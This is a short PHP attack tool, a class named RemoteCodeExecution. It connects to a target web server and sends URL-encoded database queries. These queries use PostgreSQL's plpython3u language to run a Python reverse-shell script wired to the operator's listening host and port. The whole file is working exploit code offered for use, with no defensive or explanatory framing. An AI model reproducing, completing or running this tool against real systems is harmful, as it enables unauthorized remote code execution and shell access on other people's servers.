<?php
    Class RemoteCodeExecution{
        public function init($target,$http_payload,$master){
            $this->handler=$master;
            $this->payload=$http_payload;
            $this->scripts=array(file_get_contents("scripts/shell.py"));
            $this->LANG=array("Python","plpython3u");
            $this->sock=socket_create(AF_INET,SOCK_STREAM,0);
            try{socket_connect($this->sock,$target,80);echo "connected!";}catch(exception $error){
            echo "Invalid Target :(";exit;
            }


         


        }
        public function exploit(){
            foreach($this->LANG as $lang){
                foreach($this->scripts as $script){
                foreach(json_decode(file_get_contents('queries.json'),true)["others"] as $query){
                    $script=str_replace("LPORT",$this->handler[1],$script);
                    $script=str_replace("LHOST",$this->handler[0],$script);
                    $query=str_replace("LANG",$lang,$query);
                    $query=str_replace("SCRIPT",$script,$query);
                    $this->payload=str_replace("formatted",urlencode($query),$this->payload);
                    socket_write($this->sock,$this->payload);
                    echo socket_read($this->sock,2048);
                }
            }
        }
        }
    }
?>